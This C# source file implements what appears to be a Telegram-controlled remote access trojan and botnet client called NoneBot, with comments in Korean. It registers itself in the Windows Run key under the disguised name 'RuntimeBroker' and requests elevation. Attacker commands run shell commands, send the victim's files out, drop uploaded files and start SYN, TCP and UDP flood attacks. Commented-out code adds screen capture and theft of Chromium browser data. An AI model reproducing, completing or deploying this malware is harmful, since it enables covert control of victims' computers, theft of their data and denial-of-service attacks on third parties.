using NoneBot.Common;
using NoneBot.Function;
using NoneBot.Function.Handler;
using NoneBot.Telegram;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using static System.Net.Mime.MediaTypeNames;

namespace NoneBot.Process
{
    public class CProcess
    {
        private static bool g_bIsStop = false;
        private static Random g_hRandom = new Random();
        private static CHandler ms_hHandler = new CHandler();

        public static bool GetIsStop { get { return g_bIsStop; } }
        public static Random GetRandom { get { return g_hRandom; } }
        // 부팅시 시작 프로그램을 등록하는 레지스트리 경로
        private static readonly string _strStartupRegPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

        public static void StringJoin(int i, ref string strResult, string[] szSplit)
        {
            for (; i < szSplit.Length; i++)
            {
                strResult += szSplit[i] + " ";
            }

            strResult = strResult.Trim();
        }

        private Microsoft.Win32.RegistryKey GetRegKey(string regPath, bool writable)
        {
            return Microsoft.Win32.Registry.CurrentUser.OpenSubKey(regPath, writable);
        }

        public void AddStartupProgram(string programName, string executablePath)
        {
            using (var regKey = GetRegKey(_strStartupRegPath, true))
            {
                try
                {
                    // 키가 이미 등록돼 있지 않을때만 등록
                    if (regKey.GetValue(programName) == null)
                        regKey.SetValue(programName, executablePath);

                    regKey.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }

        public void MoveFile()
        {

        }

        public bool IsAdministrator()
        {
            WindowsIdentity hIdentity = WindowsIdentity.GetCurrent();

            if (hIdentity != null)
            {
                return new WindowsPrincipal(hIdentity).IsInRole(WindowsBuiltInRole.Administrator);
            }

            return false;
        }

        public async void MainProcess()
        {
            if (!IsAdministrator())
            {
                try
                {
                    ProcessStartInfo hProcessInfo = new ProcessStartInfo();

                    hProcessInfo.UseShellExecute = true;
                    hProcessInfo.FileName = Assembly.GetEntryAssembly().Location;
                    hProcessInfo.WorkingDirectory = Environment.CurrentDirectory;
                    hProcessInfo.Verb = "runas";

                    System.Diagnostics.Process.Start(hProcessInfo);

                    // Todo: 파일 이동 필요
                }
                catch (Exception ex)
                {

                }
            }

            AddStartupProgram("RuntimeBroker", System.IO.Directory.GetCurrentDirectory() + "RuntimeBroker.exe");

            CTelegram.GetTelegramBotClient().StartReceiving(new DefaultUpdateHandler(CTelegram.HandleUpdateAsync, CTelegram.HandleErrorAsync), CTelegram.GetReceiverOptions(), CTelegram.GetCancellationToken());

            while (!g_bIsStop)
            {
                Thread.Sleep(1000);
            }

            await CTelegram.GetTelegramBotClient().CloseAsync();
        }

        public async void SubProcess(ITelegramBotClient arg1, Update arg2, CancellationToken arg3)
        {
            try
            {
                // Todo: Chat ID 외에 유저 이름, 유저 아이디, 처음 이름, 마지막 이름, 채팅 타입 등 여러가지 체크 필요
                if (arg2.Message.Chat.Id != CTelegram.GetChatID())
                {
                    // 다른 유저가 나의 봇에 명령어 시도
                    await CTelegram.SendTextMessageAsync($"!!!!! 다른 유저가 나의 봇 명령에 시도 했습니다. !!!!!\n" +
                                                        $"Chat Id : {arg2.Message.Chat.Id} \n" +
                                                        $"Text : {arg2.Message.Text}\n" +
                                                        $"UID : {arg2.Id}\n" +
                                                        $"First Name: {arg2.Message.Chat.FirstName}\n" +
                                                        $"Last Name: {arg2.Message.Chat.LastName}\n" +
                                                        $"User Name: @{arg2.Message.Chat.Username}\n" +
                                                        $"Chat Type: {arg2.Message.Chat.Type}");

                    await CTelegram.GetTelegramBotClient().SendTextMessageAsync(arg2.Message.Chat.Id, "!!! FUCK YOU !!!");
                    return;
                }

                string strCommand = arg2.Message.Text;
                Console.WriteLine(strCommand);
                try
                {
                    if (strCommand == null && arg2.Message.Document.FileName != null)
                    {
                        strCommand = arg2.Message.Caption;
                    }
                }
                catch (Exception ex)
                {

                }

                // 봇 무단 사용자에게 보낼 봇 메시지 명령어
                if (strCommand.StartsWith("/sendMessage"))
                {
                    string[] str = strCommand.Split(' ');

                    string strTarget = str[1]; // Chat Id

                    string strText = "";
                    StringJoin(2, ref strText, str);

                    await CTelegram.GetTelegramBotClient().SendTextMessageAsync(strTarget, strText);

                    return;
                }

                if (strCommand.StartsWith("/list"))
                {
                    await CTelegram.SendTextMessageAsync(ms_hHandler.GetSystem.GetStartup());
                    //    string[] str = strCommand.Split();

                    //    ms_hHandler.GetBrowser.GetChromium.GetChromiumBrowsersData();


                    //    MultipartFormDataContent hMultipartFormDataContent = new MultipartFormDataContent();
                    //    var hFileStream = new FileStream("WebInfo.zip", FileMode.Open, FileAccess.Read);

                    //    CTelegram.GetTelegramBotClient().SendDocumentAsync(CTelegram.GetChatID(), InputFile.FromStream(hFileStream, Path.GetFileName("WebInfo.zip")));

                    //    hFileStream.Close();
                    //    hFileStream.Dispose();

                    //    System.IO.File.Delete("WebInfo.zip");
                }
                else if (strCommand.StartsWith("/shell"))
                {
                    string[] str = strCommand.Split(' ');

                    string strTarget = str[1];

                    if (strTarget != ms_hHandler.GetSystem.GetExternalIP())
                    {
                        return;
                    }

                    string strResult = "";

                    StringJoin(2, ref strResult, str);

                    await CTelegram.SendTextMessageAsync(ms_hHandler.GetSystem.ExcuteShell(strResult));
                }
                //else if (strCommand.StartsWith("/screen"))
                //{
                //    try
                //    {
                //        string[] str = strCommand.Split(' ');

                //        string strTarget = str[1];

                //        if (strTarget != ms_hHandler.GetSystem.GetExternalIP())
                //        {
                //            return;
                //        }
                //    }
                //    catch (Exception ex)
                //    {
                //        await CTelegram.SendTextMessageAsync("스크린을 캡처할 사용자를 선택하지 않으셨습니다.\n모든 사용자 스크린 캡처를 시도합니다...");
                //    }

                //    string strFileName = "s_output.png";
                //    ms_hHandler.GetSystem.GetScreen().Save(strFileName);
                //    var hFileStream = new FileStream(strFileName, FileMode.Open, FileAccess.ReadWrite);

                //    CTelegram.GetTelegramBotClient().SendPhotoAsync(CTelegram.GetChatID(), InputFile.FromStream(hFileStream)); ;

                //    hFileStream.Close();
                //    hFileStream.Dispose();
                //    System.IO.File.Delete(strFileName);
                //}
                else if (strCommand.StartsWith("/cam"))
                {

                }
                else if (strCommand.StartsWith("/download"))
                {
                    string[] str = strCommand.Split(' ');

                    string strTarget = str[1];

                    if (strTarget != ms_hHandler.GetSystem.GetExternalIP())
                    {
                        return;
                    }

                    string strResult = "";

                    StringJoin(2, ref strResult, str);

                    if (!System.IO.File.Exists(strResult))
                    {
                        await CTelegram.SendTextMessageAsync(CErrorCode.NOTFINDFILE);
                        return;
                    }

                    MultipartFormDataContent hMultipartFormDataContent = new MultipartFormDataContent();
                    var hFileStream = new FileStream(strResult, FileMode.Open, FileAccess.Read);

                    await CTelegram.GetTelegramBotClient().SendDocumentAsync(CTelegram.GetChatID(), InputFile.FromStream(hFileStream, Path.GetFileName(strResult)));

                    hFileStream.Close();
                    hFileStream.Dispose();
                }
                else if (strCommand.StartsWith("/upload"))
                {
                    FileStream hFileStream = new FileStream(arg2.Message.Document.FileName, FileMode.Create);
                    var hFile = await CTelegram.GetTelegramBotClient().GetFileAsync(arg2.Message.Document.FileId);

                    await CTelegram.GetTelegramBotClient().DownloadFileAsync(hFile.FilePath, hFileStream);

                    hFileStream.Close();
                    hFileStream.Dispose();
                }
                else if (strCommand.StartsWith("/ddos"))
                {
                    string[] str = strCommand.Split();

                    int j = str.Length;

                    string strIP = "";
                    int iPort = -1;

                    for (int i = 1; i < str.Length; i++)
                    {
                        if (j < 1)
                        {
                            break;
                        }

                        if (str[i] == "-stop")
                        {
                            await CTelegram.SendTextMessageAsync("DDoS Stoping...");
                            CDDoS.StopDDoS();
                            await CTelegram.SendTextMessageAsync("DDoS Stoping... Ok");
                            return;
                        }

                        if (str[i][0] != '-')
                        {
                            continue;
                        }

                        switch (str[i][1])
                        {
                            case 'i':
                                {
                                    strIP = str[i + 1];
                                    break;
                                }
                            case 'p':
                                {
                                    iPort = int.Parse(str[i + 1]);
                                    break;
                                }
                            case 't':
                                {
                                    if (str[i + 1][0] != '-')
                                    {
                                        break;
                                    }

                                    switch (str[i + 1])
                                    {
                                        case "-sf":
                                            {
                                                CDDoS.ms_hOptions.On_L4_SYN_FLOODING_TCP = true;
                                                break;
                                            }
                                        case "-f":
                                            {
                                                CDDoS.ms_hOptions.On_L4_FLOODING_TCP = true;
                                                break;
                                            }

                                    }
                                    break;
                                }
                            case 'u':
                                {
                                    if (str[i + 1][0] != '-')
                                    {
                                        break;
                                    }

                                    switch (str[i + 1])
                                    {
                                        case "-f":
                                            {
                                                CDDoS.ms_hOptions.On_L4_FLOODING_UDP = true;
                                                break;
                                            }
                                        case "-sra":
                                            {
                                                CDDoS.ms_hOptions.On_L4_SLOW_RATE_ATTACK_UDP = true;
                                                break;
                                            }

                                    }
                                    break;
                                }
                            default:
                                {
                                    continue;
                                }
                        }

                        j--;
                    }

                    if (strIP == "" || iPort == -1)
                    {
                        await CTelegram.SendTextMessageAsync("DDoS 공격을 위한 타겟 IP와 포트가 설정되지않았습니다.");
                        return;
                    }

                    await CTelegram.SendTextMessageAsync("DDoS 공격을 시행을 위한 쓰레드 생성 중입니다...\n공격을 그만하시려면 /ddos -stop을 입력해주세요...");
                    ms_hHandler.GetDDoS.Execute(strIP, iPort);
                    await CTelegram.SendTextMessageAsync("DDoS 공격을 시행 성공!!!\n공격을 그만하시려면 /ddos -stop을 입력해주세요...");
                }
                else if (strCommand.StartsWith("/loadPlugin"))
                {
                    string[] str = strCommand.Split();

                    FileStream hFileStream = new FileStream(arg2.Message.Document.FileName, FileMode.Create);
                    var hFile = await CTelegram.GetTelegramBotClient().GetFileAsync(arg2.Message.Document.FileId);

                    await CTelegram.GetTelegramBotClient().DownloadFileAsync(hFile.FilePath, hFileStream);

                    hFileStream.Close();
                    hFileStream.Dispose();

                    string argv = "";

                    StringJoin(1, ref argv, str);
                    // string strCommandPrompt = $"start {arg2.Message.Document.FileName} {argv}";
                }
                //else if (strCommand.StartsWith("/getbrowserinfo"))
                //{
                //    string[] str = strCommand.Split();

                //    ms_hHandler.GetBrowser.GetChromium.GetChromiumBrowsersData();


                //    MultipartFormDataContent hMultipartFormDataContent = new MultipartFormDataContent();
                //    var hFileStream = new FileStream("WebInfo.zip", FileMode.Open, FileAccess.Read);

                //    CTelegram.GetTelegramBotClient().SendDocumentAsync(CTelegram.GetChatID(), InputFile.FromStream(hFileStream, Path.GetFileName("WebInfo.zip")));

                //    hFileStream.Close();
                //    hFileStream.Dispose();

                //    System.IO.File.Delete("WebInfo.zip");
                //}
            }
            catch (Exception e)
            {
                await CTelegram.SendTextMessageAsync(e.ToString());
            }
        }
    }
}
